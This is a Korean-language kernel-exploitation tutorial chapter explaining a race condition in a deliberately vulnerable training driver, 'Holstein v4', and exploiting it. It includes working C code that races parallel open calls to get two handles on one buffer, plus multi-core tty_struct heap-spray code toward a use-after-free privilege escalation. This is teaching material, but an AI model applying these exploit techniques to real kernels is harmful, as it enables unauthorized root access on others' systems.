---
title: "Holstein v4: Race Condition"
tags:
    - [Linux]
    - [Kernel]
    - [Race Condition]
    - [Data Race]
lang: kr
permalink: /kr/linux-kernel/LK01/race_condition.html
pagination: true
bk: use_after_free.html
fd: ../LK02/null_ptr_deref.html
---
[앞 장](use_after_free.html)에서는 Holstein 모듈의 Use-after-Free를 악용해 권한 상승에 성공했습니다. 세 번째 패치에서야 Holstein 모듈 개발자는 모듈을 수정해 Holstein v4를 공개했습니다. 개발자 말로는 이제 더 이상 취약점이 없고, 앞으로 업데이트도 없다고 합니다. 이 장에서는 최종판인 Holstein 모듈 v4를 익스플로잇합니다.

## 패치 분석
최종판 v4는 [여기](distfiles/LK01-4.tar.gz)에서 다운로드할 수 있습니다. 먼저 v3와의 차이를 봅시다.
먼저 부팅 스크립트 `run.sh`는 멀티코어로 동작하도록 바뀌었습니다.
```diff
-    -smp 1 \
+    -smp 2 \
```
프로그램 쪽은 메모리 누수와 Use-after-Free가 수정되었습니다.
첫 번째 수정은 `open`입니다. 이미 누군가 드라이버를 열고 있는 경우 변수 `mutex`가 1이 되어 `open`이 실패하도록 설계되었습니다.
```c
int mutex = 0;
char *g_buf = NULL;

static int module_open(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_open called\n");

  if (mutex) {
    printk(KERN_INFO "resource is busy");
    return -EBUSY;
  }
  mutex = 1;

  g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }

  return 0;
}
```
즉 `open` 도중에 드라이버를 다시 여는 것은 불가능해졌습니다. 열린 파일 디스크립터를 `close`하면 `mutex`가 0으로 돌아가고 다시 `open`할 수 있습니다.
```c
static int module_close(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_close called\n");
  kfree(g_buf);
  mutex = 0;
  return 0;
}
```
그렇다면 취약점은 어디에 있을까요? 잠깐 생각해 봅시다.

## Race Condition
이번 드라이버 구현은 완벽해 보일 수도 있지만, 사실은 여전히 **여러 프로세스가 하나의 리소스에 접근하는 상황**을 완전히 고려하지 못했습니다.
OS는 여러 프로세스나 스레드를 동시에 실행하기 위해 컨텍스트 스위치를 구현하며, 이 전환은 함수 단위 같은 큰 단위가 아니라 명령어 단위[^1]로도 일어납니다. 당연히 `module_open` 함수가 실행되는 도중에도 컨텍스트가 바뀔 수 있습니다.
이 장에서는 이런 멀티스레드, 멀티프로세스 상황에서 발생하는 **경합 문제(Race Condition)**를 악용해 익스플로잇을 작성합니다.

### 발생 조건
먼저 경쟁 상태가 어떤 결과를 낳는지 생각해 봅시다. 예를 들어 다음과 같은 순서로 컨텍스트 스위치가 일어났다고 가정합니다.

<center>
  <img src="img/race1.png" alt="멀티스레드에서의 정상 동작 예시" style="width:620px;">
</center>

처음에 `mutex`에는 0이 들어 있으므로 스레드 1은 조건 분기에서 점프해 `g_buf`를 할당하는 경로에 도달합니다. 그리고 파란색 명령에서 `g_buf`에 주소가 들어갑니다.
이후 컨텍스트 스위치가 발생해 실행이 스레드 2로 넘어갑니다. 이때 스레드 2 입장에서는 `mutex`에 이미 1이 들어 있으므로 조건 분기에서 점프하지 않고, `EBUSY`를 반환하는 경로에 도달해 `open`이 실패합니다.
따라서 이 예시는 개발자가 의도한 대로 `module_open`이 동작합니다.
이제 아래 그림과 같은 실행 순서를 생각해 봅시다.

<center>
  <img src="img/race2.png" alt="Race Condition에 빠지는 동작 예시" style="width:620px;">
</center>

앞과 마찬가지로 스레드 1은 `g_buf`를 할당하는 경로에 도달합니다. 하지만 이번에는 `mutex`에 1을 넣기 전에 컨텍스트 스위치가 발생합니다.
그러면 스레드 2가 조건 분기를 검사할 시점에도 `mutex`에는 아직 0이 들어 있으므로, 스레드 2 역시 `g_buf`를 할당하는 경로로 진입합니다. 그리고 파란색 명령에서 할당된 주소가 `g_buf`에 들어갑니다.
이후 다시 컨텍스트 스위치가 발생해 실행이 스레드 1로 돌아오면, 스레드 1도 버퍼를 할당하고 빨간색 명령으로 그 주소를 `g_buf`에 저장합니다.
결국 두 스레드 모두 `open`에 성공하게 되고, 스레드 1이 할당한 주소를 양쪽 스레드가 모두 사용하는 상태가 됩니다.

이처럼 커널 공간 코드를 설계할 때는 항상 멀티스레드를 고려해야 합니다. 그렇지 않으면 이런 버그가 생깁니다.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="늑대" ></div>
  <p class="says">
   변수 <code>mutex</code>를 읽고 쓸 때 atomic 연산을 사용하지 않았기 때문에 생긴 경쟁이야.
  </p>
</div>

`open`이 두 번 성공하면, 한쪽에서 `close`가 호출된 뒤에도 `g_buf`는 해제된 포인터를 계속 가리키므로, 앞 장과 같은 Use-after-Free를 일으킬 수 있습니다.

### 경쟁을 성공시키기
먼저 `open` 경쟁이 실제로 가능한지 코드를 작성해 확인해 봅시다.
여러 스레드에서 `open`을 계속 호출하면 경쟁 자체는 쉽게 발생하지만, 성공했는지 판정할 방법이 필요합니다. 판정 방법은 다양하지만, 기본적으로는 두 스레드에서 `read`를 해 보고 둘 다 성공하면 성공으로 보는 것이 자연스럽습니다. 다만 이번에는 불필요한 `read` 호출을 줄이기 위해 파일 디스크립터를 확인하기로 했습니다. 두 스레드 모두 `open`에 성공한 경우, 반드시 한쪽의 파일 디스크립터는 4가 되기 때문입니다.
저자는 아래처럼 같은 함수를 2개의 스레드에서 돌려 경쟁 상태를 만드는 코드를 작성했습니다. 물론 메인 스레드에서 루프를 돌려도 되고, 경쟁 성공 판정 방법도 각자 원하는 방식으로 설계해도 됩니다. 컴파일할 때 `-lpthread`를 넣어 `libpthread`를 링크하는 것을 잊지 마세요.
```c
void* race(void *arg) {
  while (1) {
    // 어느 한쪽 스레드에서 fd가 4가 될 때까지 경쟁 시도
    while (!win) {
      int fd = open("/dev/holstein", O_RDWR);
      if (fd == 4) win = 1;
      if (win == 0 && fd != -1) close(fd);
    }

    // 상대 스레드가 우연히 fd를 닫아 버리지 않았는지 확인
    if (write(3, "A", 1) != 1 || write(4, "a", 1) != 1) {
      // 실패
      close(3);
      close(4);
      win = 0;
    } else {
      // 성공
      break;
    }
  }

  return NULL;
}

int main() {
  pthread_t th1, th2;

  pthread_create(&th1, NULL, race, NULL);
  pthread_create(&th2, NULL, race, NULL);
  pthread_join(th1, NULL);
  pthread_join(th2, NULL);

  char buf[0x400];
  int fd1 = 3, fd2 = 4;
  write(fd1, "Hello", 5);
  read(fd2, buf, 5);
  printf("%s\n", buf);

  return 0;
}
```
이렇게 하면 거의 100% 확률로 경쟁에 성공한다는 것을 알 수 있습니다. 성공까지 걸리는 시간도 밀리초 단위라서, primitive로 쓰기에 충분합니다.

<div class="column" title="칼럼: Race condition과 Data race">
  "race condition"과 "data race"는 비슷하게 들리지만 같은 뜻이 아니며, 서로를 보완하는 병렬 용어도 아닙니다.<br>
  data race는 두 스레드가 같은 메모리 위치를 동시에(비동기적으로) 접근하고, 그중 적어도 하나가 쓰기인 상태를 의미합니다. 따라서 data race는 정의되지 않은 동작을 일으킵니다. 이는 적절한 배타 제어나 atomic 연산으로 해결할 수 있습니다.<br>
  반면 race condition은 멀티스레드의 실행 순서에 따라 다른 결과가 나오는 상태를 의미합니다. 이는 로직 버그와 비슷하게 "프로그래머가 그렇게 작성했기 때문에 그렇게 동작하는" 경우입니다. 예상치 못한 동작은 일어나지만, 그것이 곧 정의되지 않은 동작을 의미하는 것은 아닙니다. 멀티스레드 때문에 프로그래머 의도와 다른 결과가 나오면 race condition 버그가 있다고 할 수 있습니다.<br>
  이번 드라이버에는 구현 실수로 인한 race condition이 있고, 그 결과 버퍼 포인터에 대한 data race도 발생합니다.
</div>

## CPU와 Heap Spray
이번처럼 멀티스레드로 경쟁 익스플로잇을 구현하는 일은 자주 있는데, 이때 하나 더 주의할 점이 있습니다.
여러 스레드가 경쟁 상태를 만들고 있다는 것은 공격 시 여러 CPU 코어가 사용된다는 뜻입니다. 그러면 당연히 그중 하나의 CPU 코어에서 `module_open`이 호출되어 `kzalloc`으로 메모리 영역을 할당합니다.
여기서 예전에 Heap Overflow 장에서 설명한 [SLUB allocator](heap_overflow#slub-allocator)의 특징을 떠올려 봅시다. SLUB allocator는 객체 할당에 사용하는 slab을 CPU별 메모리 영역으로 관리합니다.
즉 지금 `main` 함수가 실행 중인 스레드와 다른 CPU 코어에서 할당된 `g_buf`가 `kfree`되면, 그 메모리는 그 CPU 코어에 대응하는 slab으로 다시 연결됩니다. 그러면 이후 `main` 스레드에서만 Heap Spray를 해서는, `kfree`된 `g_buf`와 겹치지 않습니다.
따라서 이번 같은 상황에서는 **Heap Spray도 여러 스레드에서 수행하도록** 주의해야 합니다.

또한 `/dev/ptmx`를 열면 새로운 파일 디스크립터가 생성되는데, 한 프로세스가 만들 수 있는 파일 디스크립터 수에는 한계가 있습니다. 대량 spray가 필요할 때는, spray가 맞았다고 판단한 시점에 관련 없는 파일 디스크립터를 닫는 식의 정리도 필요합니다.
```c
void* spray_thread(void *args) {
  long x;
  long spray[800];

  for (int i = 0; i < 800; i++) {
    usleep(10);
    // tty_struct spray
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) {
      for (int j = 0; j < i; j++)
        close(spray[j]);
      return (void*)-1;
    }

    if (read(fd2, &x, sizeof(long)) == sizeof(long) && x) {
      // hit
      for (int j = 0; j < i; j++)
        close(spray[j]);
      return (void*)spray[i];
    }
  }

  for (int i = 0; i < 800; i++)
    close(spray[i]);
  return (void*)-1;
}

...

  // Use-after-Free 만들기
  close(fd1);

  /* 여러 코어에서 Heap Spray */
  long victim_fd = -1;
  // 먼저 메인 스레드에서 시도
  victim_fd = (long)spray_thread(NULL);
  // 메인 스레드에서 실패하면 다른 스레드 결과 사용
  while (victim_fd == -1) {
    puts("[+] spraying on another CPU...");
    pthread_create(&th1, NULL, spray_thread, NULL);
    pthread_join(th1, (void*)&victim_fd);
  }
```

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_normal.png" alt="늑대" ></div>
  <p class="says">
   <code>sched_setaffinity</code> 함수를 쓰면 스레드가 사용할 CPU를 제한할 수 있어서, 코어 수가 늘어나도 2코어일 때와 비슷한 동작을 강제할 수 있어.
  </p>
</div>

## 권한 상승
이제부터는 앞서와 같은 방식으로 권한 상승을 하면 됩니다.
데이터 경쟁으로 Use-after-Free를 만들고, 그 위에 Heap Spray로 `tty_struct`를 올리는 흐름입니다. 이 과정을 함수로 묶어 두면 Use-after-Free를 여러 번 발생시키는 코드도 쉽게 작성할 수 있습니다.

샘플 익스플로잇은 [여기](exploit/race-krop.c)에서 다운로드할 수 있습니다.

<center>
  <img src="img/race_privesc.png" alt="Race Condition을 통한 권한 상승" style="width:320px;">
</center>

Race condition 익스플로잇은 디버깅이 어렵기 때문에, 이론이 실제로 구현 가능한지와 높은 확률로 안정적으로 race를 일으키는 primitive를 만들 수 있는지가 개발의 핵심이 됩니다.

[^1]: CPU에 따라서는 최적화를 위해 명령 실행 순서가 바뀌는 더 미세한 수준의 문제도 있지만, 이번에는 관련이 없으므로 설명하지 않습니다.

---

<div class="column" title="예제">
  qemu 부팅 옵션에서 CPU 코어 수를 4나 8로 늘렸을 때, 여러분이 작성한 exploit의 race와 spray가 어느 정도 확률로 동작하는지 확인해 봅시다.<br>
  또한 실패 확률이 높다면, 코어 수에 의존하지 않고 높은 확률로 동작하도록 exploit을 수정해 봅시다.
</div>
